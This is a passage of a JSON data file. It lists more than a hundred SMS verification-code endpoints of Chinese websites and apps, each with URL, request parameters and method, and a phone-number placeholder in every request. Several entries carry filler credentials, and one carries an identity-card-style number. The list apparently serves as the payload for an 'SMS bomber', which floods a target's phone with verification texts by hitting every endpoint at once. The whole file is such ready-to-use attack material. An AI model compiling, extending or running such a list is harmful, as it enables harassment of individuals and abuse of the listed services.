        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/passport.xinpianchang.com\/api\/v1\/mobile\/send",
        "parm": "is_register=1&phone=手机号码&prefix_code=%2B86",
        "type": "POST"
    }, {
        "url": "https:\/\/www.leapcloud.cn\/1.0\/sms\/requestSmsCode",
        "parm": "{\"phone\":\"手机号码\"}",
        "type": "POST"
    }, {
        "url": "http:\/\/www.tlswhy.com\/send\/iphone?iphone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.alrwhy.com\/send\/iphone?iphone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/yun.bjgxgc.cn\/web\/defaulted\/login\/sendSms",
        "parm": "userName=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/lhccs.chaoxing.com\/ppregister\/手机号码\/sendvfcncode",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.snjwhy.com\/send\/iphone?iphone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/nbculture.com\/frontTerminalUser\/sendSmsCode.do?1548146442169",
        "parm": "userMobileNo=手机号码&userName=mskdls&userPwd=123456dd&type=http%3A%2F%2Fnbculture.com%2FwechatUser%2FpreTerminalUser.do",
        "type": "POST"
    }, {
        "url": "http:\/\/china.wenhuayun.cn\/muser\/loginSendCode.do",
        "parm": "mobileNo=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/jz.sx.wenhuayun.cn\/frontTerminalUser\/sendSmsCode.do?asm=1548145000136",
        "parm": "userMobileNo=手机号码&userName=dsfsf&userPwd=123456dd&userSex=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.hnwenhuayun.gov.cn\/send\/iphone?iphone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/ah.wenhuayun.cn\/frontTerminalUser\/sendSmsCode.do?asm=1548145222083",
        "parm": "userMobileNo=手机号码&userName=ddfssdf&userPwd=123456dd&userSex=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.wzwhy.cn\/index.php\/Home\/Login\/getCode.html",
        "parm": "telephone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/szwhg.hhhtsqzysg.cn\/send\/iphone?iphone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/gzbjwhy.cn\/account\/registersendcode",
        "parm": "Mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/mz.gd.wenhuayun.cn\/frontTerminalUser\/sendSmsCode.do?asm=1548145533056",
        "parm": "userMobileNo=手机号码&userName=sdjis&userPwd=123456dd&userSex=1",
        "type": "POST"
    }, {
        "url": "http:\/\/tcsclouds.lib.chaoxing.com\/ppregister\/手机号码\/sendvfcncode",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/wenmind.sdlib.com\/\/rest\/accountCenter\/getSMSCode\/手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/hyccs.chaoxing.com\/ppregister\/手机号码\/sendvfcncode",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/restapi.fishsaying.com\/cultural-cloud\/regist\/send\/code?phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.zcwhy.gov.cn\/home\/register\/getVerify",
        "parm": "phone_mob=手机号码&type=1",
        "type": "POST"
    }, {
        "url": "https:\/\/fzccs.chaoxing.com\/ppregister\/手机号码\/sendvfcncode",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.whpd.sh.cn\/why\/frontTerminalUser\/sendSmsCode.do?asm=1548144815853",
        "parm": "userMobileNo=手机号码&userName=dhjdkf&userPwd=123456dd&userSex=1",
        "type": "POST"
    }, {
        "url": "https:\/\/ums.gaoding.com\/api\/users\/verify-code",
        "parm": "{\"type\":\"register\",\"mobile\":\"手机号码\",\"mobile_area_code\":86}",
        "type": "POST"
    }, {
        "url": "http:\/\/hkwhy.com.cn\/frontTerminalUser\/sendSmsCode.do?asm=1548144438873",
        "parm": "userMobileNo=手机号码&userName=mdksjd&userPwd=123456dd&userSex=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.jsggwhy.com\/index.php?s=\/Home\/User\/send_short_msg.html",
        "parm": "tel=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/wh.fs.cn\/frontTerminalUser\/sendSmsCode.do?asm=1548144598875",
        "parm": "userMobileNo=手机号码&userName=misdfds&userPwd=123456dd&userSex=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.cneexam.com\/sign\/SendMessageCode",
        "parm": "account=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/web.268xue.com\/web\/user\/ajax\/sendMobileMsg",
        "parm": "mobile=手机号码&status=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.zhenyouedu.cn\/checkuser.aspx?login=12&phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.sciyard.com\/account\/sendmessage",
        "parm": "mobilecode=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/crm.api.zhongtukj.cn\/v1\/sys\/register\/sendMessageCode?mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/lcy.a.dyysoft.net\/api\/small\/mem\/send-sms-servlet",
        "parm": "{\"cmd\":\"sendSmsCode\",\"data\":{\"mem_phone\":\"手机号码\"}}",
        "type": "POST"
    }, {
        "url": "http:\/\/www.wotui.com\/seeker\/send-phone-code.html",
        "parm": "phoneNumber=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.dituiba.com\/SmsServlet?phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.umarketchina.com\/emall\/login!gotcode.htm",
        "parm": "phone=手机号码&op=&areaCode=%2B86",
        "type": "POST"
    }, {
        "url": "http:\/\/www.bofsoft.com\/sendVerifyCode",
        "parm": "{\"Mobile\":\"手机号码\",\"VerityType\":1}",
        "type": "POST"
    }, {
        "url": "https:\/\/www.kaoshixing.com\/account\/regist_sms_verify_code",
        "parm": "phone=手机号码&source=companySignup",
        "type": "POST"
    }, {
        "url": "https:\/\/admin.youkaoshi.cn\/sign-up.raw?task=sms.teacherRegisterCode",
        "parm": "phone=手机号码&c965f2f8591b687230fc23db168a1726=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.nuoren.cn\/api\/\/member\/common\/sendcode",
        "parm": "mobile=手机号码&piccode=&type=1&secret=www.nuoren.cn&",
        "type": "POST"
    }, {
        "url": "https:\/\/dev.getui.com\/gt_dev_center\/security\/sendRegisterCode",
        "parm": "{\"key\":\"手机号码\",\"username\":\"123456@qq.com\"}",
        "type": "POST"
    }, {
        "url": "http:\/\/wx.cq3g.cn\/shop\/sendSmsCode?phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/wufuic.dadayc.com\/verifyCode\/send?verify-phone=手机号码&verify-url=\/app\/user\/bingingWechat",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/m.jekunauto.com\/v2\/user\/verify",
        "parm": "username=手机号码&hash_key=gxDwBuwu&hash_str=kc74u8h%2FohUhP%2BFYuJOmmIqDtBc%3D",
        "type": "POST"
    }, {
        "url": "https:\/\/s.viomi.com.cn\/services\/vmall\/user\/sendAuthCode.json?mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/s.api.qukandian.com\/Quyou2\/LoginCaptcha?tel=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/id.ifeng.com\/api\/simplesendmsg?comefrom=38&msgtype=0&auth=&mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/haiwaivideo.haiwainet.cn\/auth\/v1\/HKBBTVSSK\/captcha?mobile=手机号码&country_code=86&type=register&plt=android&guid=c18fc29aea7a1a682f3669975828c534",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/chiji.3yx.cn\/sms\/sendCaptchaSms?userPhone=手机号码&modelType=100",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/4g.renhe.cn\/v6\/register\/sendRegisterMobileVerificationCode.shtml?deviceInfo=renhe_android&mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/47.97.20.12\/memcenter\/valid_msg.do?s=e8957f5d82ec77a0d46298ade27c057c&nt=1546406198&n=wifi&o=android&ime2=2b5be7be4c9e36a2354aedaac931a7d4&v=1190&c=xiaomi&p=com.leku.rjtv&u=&ps=0010&m=&i=6ba6ff4a473f991d8ce4a8fdc31cabfc&appcode=rjtv&a=&mobile=手机号码&tp=c",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/bizapi.pezy.cn\/qknode\/sms\/reqSmsCode?df=android&publishid=1003&deviceId=8812baafc8de4fe4&vt=5&screen=720x1280&deviceid=&os=android&proid=qknode&av=MMB29M&appVersion=1.6.1&imei=&ov=6.0.1&osVersion=6.0.1&deviceVersion=Redmi%204A&osLevel=23&phone=手机号码&token=&isChangeChannel=0",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/id.ifeng.com\/api\/simplesendmsg?mobile=手机号码&comefrom=39&auth=&msgtype=0",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.pbsti.com\/usercode\/getCode.html",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/api.huatu.com\/lumenapi\/v4\/common\/message\/send_by_java?callback=callbackSendCode&mobile=手机号码&_=1547130695671",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/lend.crfchina.com\/webp2p_interface_mysql\/sms\/verifycode",
        "parm": "{\"mobilePhone\":\"手机号码\",\"intent\":\"1\",\"type\":\"0\",\"picCode\":null}",
        "type": "POST"
    }, {
        "url": "https:\/\/h5passport.wostore.cn\/user_management\/login\/getSmsCode\/手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.xiutalk.com\/ishowMH\/admin\/userManageNew\/getCodeBySendPhoneNumV1.do",
        "parm": "userPhone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/baika.miaopijinrong.com\/api\/site\/sendsms",
        "parm": "type=registered&mobile_phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/shenjiejidian.com\/SMSCall\/client\/callPhone!callNumPhone.action",
        "parm": "memberId=92&phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/report.12377.cn:13225\/sendsms.do",
        "parm": "telephone=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/ucenter.xmeise.com\/index\/sms\/?mobile=手机号码&page_type=signup&form_hash=110474&callback=jQuery17207635549569415818_1547993319902&_=1547993438627",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/www.ezaiai.com\/index\/sms\/?mobile=手机号码&page_type=signup&form_hash=290003&callback=jQuery17207813271294868773_1547993650310&_=1547993655687",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/passport.ptqy.gitv.tv\/apis\/phone\/secure_send_cellphone_authcode.action",
        "parm": "agenttype=44&serviceId=2&ptid=04035002101000000000&dfp=a02c4ad7c6ff9b4c58a61dccdae66531e7b981ebe169ca7b2ad898c61ab7d3bb33&cellphoneNumber=手机号码&area_code=86&requestType=22&vcode=&qd_sc=97e8fe5fa5e3f325491e072b1b24e930",
        "type": "POST"
    }, {
        "url": "https:\/\/pass.cctalk.com\/v2\/Handler\/UCenter?action=SendMsg&mobile=%2B86-手机号码&imgcode=&token=0a88850aac2e0df0396ff11664eef125&sendtype=register&msgtype=1&captchaVersion=2&user_domain=cc&business_domain=&hpuid=lWyCvONzJBBWGv8Llg630&callback=reqwest_1538548741726739917",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/admin.dggjqw.com\/api\/get_sms_code2.do?callback=flightHandler&tel=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/mlife.cmbchina.com\/AppMgm\/getSmsToken.json",
        "parm": "recmendedUserMobile=手机号码&userId=UTl5CwzCFhyBe2GiWHA%2FtWLj8T7%2Fw9le%2FPe9NEI1cUWC00VABckPKw&invitationSerialNo=",
        "type": "POST"
    }, {
        "url": "http:\/\/gg-app.youyoushenghuo.net\/index.php\/Home\/Tools\/sendVerifyCode",
        "parm": "phone=手机号码&type=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.txooo.com\/Txooo\/Main\/BusinessRequirement\/Ajax\/BusinessRequirementAjax.ajax\/SendMobileCode?mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/sweb.jyblife.com\/base\/index?ts=1542429913778&cmd=42010101&tel=手机号码&userid=&token=",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/ucenter.inyuapp.com\/v1\/login\/mobile\/code",
        "parm": "mobile=手机号码&country_code=86",
        "type": "POST"
    }, {
        "url": "https:\/\/passport.vip.com\/register\/sendSms",
        "parm": "mobile=手机号码&captchaId=&captchaTicket=",
        "type": "POST"
    }, {
        "url": "https:\/\/www.1000.com\/reg\/check\/mobile",
        "parm": "mobile=手机号码&qmext=&refer=https%3A%2F%2Fwww.1000.com%2F%3F_ga%3D2.118592457.175791261.1547102215-1536380910.1547102215",
        "type": "POST"
    }, {
        "url": "http:\/\/www.yifatong.com\/Customers\/getcode?rnd=1547130583.623&mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/exmail.qq.com\/cgi-bin\/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/www.bagong.cn\/?m=Passport&a=SendPhoneCode&callback=jQuery19109463907517522203_1547809723896&phone=手机号码&_=1547809723897",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/passport.fang.com\/loginsendmsm.api?MobilePhone=手机号码&Service=secondhouse&MathCode=&Operatetype=2",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/bank.wo.cn\/hand\/getRandCode",
        "parm": "phone=手机号码&flag=3",
        "type": "POST"
    }, {
        "url": "https:\/\/wx.nicaifu.com\/api\/apirt?_=1509987553165",
        "parm": "path=%2Fmv2%2Fsms%2Findex%3Fv%3D1.7.2&data=%7B%22type%22%3A%22login%22%2C%22mobile%22%3A%22手机号码%22%2C%22is_voice%22%3A0%7D&reqtoken=9646cf7776e5f09915ac83edb186590e8d322fad4c3f39e947d3da53afc2b535",
        "type": "POST"
    }, {
        "url": "http:\/\/wifi.gd118114.cn\/getPassword.ajax",
        "parm": "username=手机号码&accessType=1&circleId=100000055&getPasswordValidCode=",
        "type": "POST"
    }, {
        "url": "https:\/\/sso.kuaidi100.com\/sso\/smssend.do",
        "parm": "name=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/account.smartisan.com\/v2\/cellphone\/?m=post",
        "parm": "cellphone=%2B86%20手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/b2c.csair.com\/portal\/smsMessage\/EUserVerifyCode",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/pass.hujiang.com\/v2\/Handler\/UCenter?action=SendMsg&mobile=%2B86-手机号码&imgcode=&token=23c4e2a7f496ebbe29624554d42a8caf&sendtype=register&msgtype=1&captchaVersion=2&user_domain=hj&business_domain=&hpuid=iV6Q5w2QY5mGvSf7MF536&callback=reqwest_1534167824791453137_1534167824791453137",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/sso.dazhuanjia.com\/idp\/auth\/requestTokenToLoginByCellphone?cellphone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/interface57.fangdongliqi.com\/User\/GetCode?OS=2&LoginName=%2B86%20手机号码&LoginNameType=1&Path=1&Version=6.6.1",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/api-user.mmall.com\/api\/common\/smsCode2?appId=C7D84F4B&appVersion=36&fromSource=10001&smsType=10002&captcha=&enableCapatcha=true&deviceId=WV41Ugcy6kUDAKk6OY5yoSFV&mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/appapi.mala.cn\/api\/mobile\/index.php?act=send&phone=手机号码&module=sendsms&version=1",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/wx.cq3g.cn\/shop\/sendSmsCode?phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/hdgateway.zto.com\/auth_account_sendLoginOrRegisterSmsVerifyCode",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/sweb.jyblife.com\/base\/index?ts=1542429913778",
        "parm": "{\"cmd\":\"42010101\",\"tel\":\"手机号码\",\"userid\":\"\",\"token\":\"\"}",
        "type": "POST"
    }, {
        "url": "http:\/\/sms.321mh.com\/user\/v1\/sendsms",
        "parm": "mobile=手机号码&service=mht&countryCode=&imgCode=&refresh=0&localtime=&client-channel=tencent&client-type=android&productname=mht&client-version=1.7.4&platformname=android",
        "type": "POST"
    }, {
        "url": "http:\/\/id.ifeng.com\/api\/simplesendmsg",
        "parm": "mobile=手机号码&comefrom=7&auth=&msgtype=0",
        "type": "POST"
    }, {
        "url": "http:\/\/api.passport.pptv.com\/checkImageCodeAndSendMsg?cb=jQuery112406248204342127395_1526132104120",
        "parm": "aliasName=手机号码&scene=REG_PPTV_WAP&sceneFlag=2&channel=208000200000&format=jsonp&deviceId=9PlY163548fdc15GqqI&dfpToken=9PlY163548fdc15GqqI&_=1526132104122",
        "type": "POST"
    }, {
        "url": "https:\/\/m.10010.com\/god\/AirCheckMessage\/sendCaptcha",
        "parm": "phoneVal=手机号码&type=21",
        "type": "POST"
    }, {
        "url": "http:\/\/user.daojia.com\/user\/getSmscode?mobile=手机号码&bu=",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/b2c.csair.com\/portal\/smsMessage\/EUserVerifyCode",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/wifi.gd118114.cn\/getPassword.ajax",
        "parm": " username=手机号码&accessType=1&circleId=100000055&getPasswordValidCode=",
        "type": "POST"
    }, {
        "url": "https:\/\/mp.elong.com\/mobilepromotion\/common\/sendactivitysmscodemtools%20",
        "parm": "activityId=9880be64-a7c2-476e-9879-2fe371910f45&mobile=手机号码&gCode=",
        "type": "POST"
    }, {
        "url": "https:\/\/account.smartisan.com\/v2\/cellphone\/?m=post",
        "parm": "cellphone=%2B86%20手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/wap.ghs.net\/wap\/wxregister-checkMobile.html",
        "parm": "uname=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/wx.nicaifu.com\/api\/apirt?_=1509987553165",
        "parm": "path=%2Fmv2%2Fsms%2Findex%3Fv%3D1.7.2&data=%7B%22type%22%3A%22login%22%2C%22mobile%22%3A%22手机号码%22%2C%22is_voice%22%3A0%7D&reqtoken=9646cf7776e5f09915ac83edb186590e8d322fad4c3f39e947d3da53afc2b535",
        "type": "POST"
    }, {
        "url": "https:\/\/sso.kuaidi100.com\/sso\/smssend.do",
        "parm": "name=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/uac.10010.com\/portal\/Service\/SendMSG?callback=jQuery172076565523879526_1506486642542&req_time=1506486656403&mobile=手机号码&_=1506486656411",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/passport.ceair.com\/cesso\/mobile!geetCheck.shtml?_0.3520412800489632",
        "parm": "mobileNo=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/sms.321mh.com\/user\/v1\/sendsms",
        "parm": "mobile=手机号码&service=zymk&countryCode=&imgCode=&refresh=0&localtime=&client-channel=store_tencent&loglevel=3&client-type=android&client-version=4.9.1",
        "type": "POST"
    }, {
        "url": "http:\/\/mall.juzifenqi.com\/termi\/sendVerifySMSVH",
        "parm": "mobile=手机号码&flag=1&verifyCode=",
        "type": "POST"
    }, {
        "url": "http:\/\/api.pinzhishangcheng.cn\/user\/sendValidCode",
        "parm": "version=5.5.5&fromType=4&mobile=手机号码&type=2&unionid=&device=&isAfterPic=0",
        "type": "POST"
    }, {
        "url": "https:\/\/passport.fanhuan.com\/login\/asklogincode?callback=jQuery18307700360712450502_1523359569433&mobile=手机号码&_=1523359575414",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/xinweixin.11183.com.cn\/youzheng\/login\/security?phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/uac.10010.com\/oauth2\/OpSms?callback=jsonp1544753247279&req_time=1544753262715&user_id=手机号码&app_code=ECS-YH-WAP",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/m.health.pingan.com\/mapi\/smsCode.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1545122608&app=0&platform=3&app_key=PAHealth&osversion=23&info=&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=m_h5&phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/passport.vip.com\/register\/sendSms",
        "parm": "mobile=手机号码&captchaId=&captchaTicket=",
        "type": "POST"
    }, {
        "url": "https:\/\/m.hua.com\/Passport\/Login\/SendLoginSmsValidCode",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/user-center.secoo.com\/service\/appapi\/user\/msg\/send",
        "parm": "clientId=3&bid=9&mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/helper.2bulu.com\/sendValidateCode",
        "parm": "p_userId=0&p_productType=0&p_terminalType=2&p_appVersion=6.1.0&mobileNumber=手机号码&unique=1&areaCode=86",
        "type": "POST"
    }, {
        "url": "https:\/\/pass.hujiang.com\/v2\/Handler\/UCenter?action=SendMsg&mobile=%2B86-手机号码&imgcode=&token=23c4e2a7f496ebbe29624554d42a8caf&sendtype=register&msgtype=1&captchaVersion=2&user_domain=hj&business_domain=&hpuid=iV6Q5w2QY5mGvSf7MF536&callback=reqwest_15341678",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.51qub.com\/member\/sendmobilesms",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/ucenter.inyuapp.com\/v1\/login\/mobile\/code",
        "parm": "mobile=手机号码&country_code=86",
        "type": "POST"
    }, {
        "url": "http:\/\/gg-app.youyoushenghuo.net\/index.php\/Home\/Tools\/sendVerifyCode",
        "parm": "phone=手机号码&type=1",
        "type": "POST"
    }, {
        "url": "https:\/\/m.jiedianqian.com\/api\/account\/send_verify_code.do?mobile=手机号码&codeLength=4&deviceType=H5&timestamp=Thu%20Jan%2010%202019%2014:33:21%20GMT+0800%20(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)&sign=98375275c34b2736d6990f2830cc7630&channel=bdssby4-109669&isLoading=false&tokenID=",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/zyzx.dgg.net\/api\/get_sms_code2do?callback=flightHandler&tel=手机号码&_=1547104197075",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/uss.lenovomm.com\/accounts\/1.4\/sendVerifyCode?msisdn=手机号码",
        "parm": "type=1&lang=zh-CN&areacode=",
        "type": "POST"
    }, {
        "url": "http:\/\/www.wed114.cn\/index.php?m=Index&a=sendVerify",
        "parm": "verify=0&mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/www.rongdaxiang.com\/m\/center_code",
        "parm": "phone=手机号码&name=%E5%93%92%E5%93%92%E5%93%92",
        "type": "POST"
    }, {
        "url": "http:\/\/sjzpapi.aidaijia.com\/api\/common\/InsertSMS?vcode=&keyid=6abe9d25-48c8-c96a-e7f0-f93515828a84&curDate=2019-2-15+13%3A24%3A42&appKey=1001005&phone=手机号码&strSig=MUI2MzI2N0NCNDIwRDNCMjU5RkQ4ODFFRTk4ODI2RTA4NDkyQUJGODZFNjNFNDEzOTA3QjJCRDQ5OTQxNTQwNkFFMEE5REMwMjhCQTU0OThBQ0FCRTc4NDgwQzgzRDIyRkQxMzIzNEJEMzg1QUIyMDgxNjdBMjY1NTlCN0Q4Q0I1M0VDQzVBMEVFNkM2MTFGQTNBQzRFNTNFRjY1NjRGQl4yTlJUWVpzcmJGQVFXalE4",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/open.ishansong.com\/openapi\/partner\/generateRegisterCaptcha",
        "parm": "{\"mobile\":\"手机号码\",\"type\":110}",
        "type": "POST"
    }, {
        "url": "https:\/\/m.huolala.cn\/index.php?_m=send_sms_code&phone_no=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/hdgateway.zto.com\/auth_account_sendLoginOrRegisterSmsVerifyCode",
        "parm": "{\"mobile\":\"手机号码\"}",
        "type": "POST"
    }, {
        "url": "http:\/\/xxdshare.51xindd.com\/extend\/vcode",
        "parm": "Account=手机号码&source=yihao",
        "type": "POST"
    }, {
        "url": "http:\/\/www.nbyczj.com\/client\/Page\/send_sms",
        "parm": "data%5Bmobile%5D=手机号码&data%5Btype%5D=CODELOGIN",
        "type": "POST"
    }, {
        "url": "http:\/\/app.kuaidaiwang.top\/common\/getcode.html",
        "parm": "mobile=手机号码&code=&check=1",
        "type": "POST"
    }, {
        "url": "https:\/\/qwyapi.suangzang.com\/credit-user\/h5-reg-get-code",
        "parm": "phone=手机号码&source=555&sign=7aabc93d6a8a79866738b45d1780864f",
        "type": "POST"
    }, {
        "url": "https:\/\/a.shuziqb.com\/hkd_boot\/userLogin\/getPhoneCodeNew?type=1&phone=手机号码&appName=hkd&graphicCode=&clientType=",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/api.lingtongdai.cn\/v2\/index.php\/api\/captcha\/sms",
        "parm": "{\"phone_num\":\"手机号码\",\"product_eng\":\"xmy\",\"channel_code\":\"bbqbxzlqg1\"}",
        "type": "POST"
    }, {
        "url": "http:\/\/47.101.29.205\/User\/applyCode",
        "parm": "phone=手机号码&owner=chuanbeiqianbao&channelCode=LJJF",
        "type": "POST"
    }, {
        "url": "http:\/\/www.baofudai.cn\/gateway\/sms\/send\/?mobile=手机号码",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/39.98.195.22:8888\/h5\/v1\/verify_codes",
        "parm": "{\"phone\":\"手机号码\",\"scene\":\"login\"}",
        "type": "POST"
    }, {
        "url": "https:\/\/bao.financesd.cn\/api\/entry\/sendSms",
        "parm": "rand=1017&params=手机号码&version=bm36Z29N9F4RJRtp4Y1oIyRtEUb0fv3SmRUsjqwqO0Q=",
        "type": "POST"
    }, {
        "url": "http:\/\/m.jinquqianbao.com\/sys\/sendRegisterVerifyCode",
        "parm": "username=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/marketing.ycrenhui.com\/api\/sms\/msg\/respMsgForPC",
        "parm": "phone=手机号码&channelId=3753",
        "type": "POST"
    }, {
        "url": "http:\/\/115.159.114.191:8080\/loanStream\/api\/sendPromotionPhoneCode?phone=手机号码&type=8&inviteCode=xiaomi&x=23&timestamp=1552630140222&sign=4a4651116fc2f0f42491f39292f9b2c8",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/wx.9fchaoneng.cn\/sys\/sms\/sendMobileCode?mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/jdappv3.haomoney.com\/jd-app\/cardniu\/x\/v1\/getVerifyCode",
        "parm": "{\"phone\":\"手机号码\",\"requestNo\":\"ufqcqgjasw4naj7k5wpmot4bxd35i9e2\"}",
        "type": "POST"
    }, {
        "url": "http:\/\/daikuan.kanzhundai.com\/DaiKuanChangYe\/v4\/msg\/sms.do?pt=dh3t",
        "parm": "pageMark=jieyun&mobile=手机号码&sid=399&cid=2247&mobile_cityCode=440100&name=哒哒哒&appBirthday=2002-03-15&appSex=M&pageToken=1552630761581",
        "type": "POST"
    }, {
        "url": "https:\/\/wm.cib.com.cn\/application\/cardapp\/common\/Verification\/getBlock?telphone=手机号码&type=MINI",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/cs.creditcard.ecitic.com\/citiccard\/cshop-scene-standardcard\/standard\/send-code",
        "parm": "{\"mobilePhone\":\"手机号码\",\"name\":\"哒哒哒\",\"namePinYin\":\"DA DA DA\",\"identifyNumber\":\"433122197408232330\",\"pid\":\"CS0083\",\"sid\":\"SJWXYBK\",\"picCode\":\"\",\"deviceId\":\"h68b48ec0ac8b48018fb4033050cbc260c9\"}",
        "type": "POST"
    }, {
        "url": "https:\/\/haoyijie.hzed.com\/loan\/hzed\/loan-api\/user\/getValidateCodeH5",
        "parm": "mobile=手机号码&channel=tikuanbao12&",
        "type": "POST"
    }, {
        "url": "http:\/\/product.uuhooo.com\/User\/SendCode?telno=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/decerp.cc\/AjaxUser\/Retrieve_Password_Dealer",
        "parm": "moble=手机号码&sv_user_ip=111.181.33.117&sv_user_cityname=&sv_code=&ValidateCode=",
        "type": "POST"
    }, {
        "url": "https:\/\/pf.zhipuzi.com\/user\/merchant\/account\/regverifyphonecode",
        "parm": "phone=手机号码&stype=2&timestamp=1552719821&signature=D2133CEF8E30C3B5E6C4C0C79071264B",
        "type": "POST"
    }, {
        "url": "http:\/\/passport.td365.com.cn\/Account\/GetMobileCode?num=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/www.yuanfeng021.com\/ajax\/sms.php",
        "parm": "tel=手机号码",
        "type": "POST"
    }, {
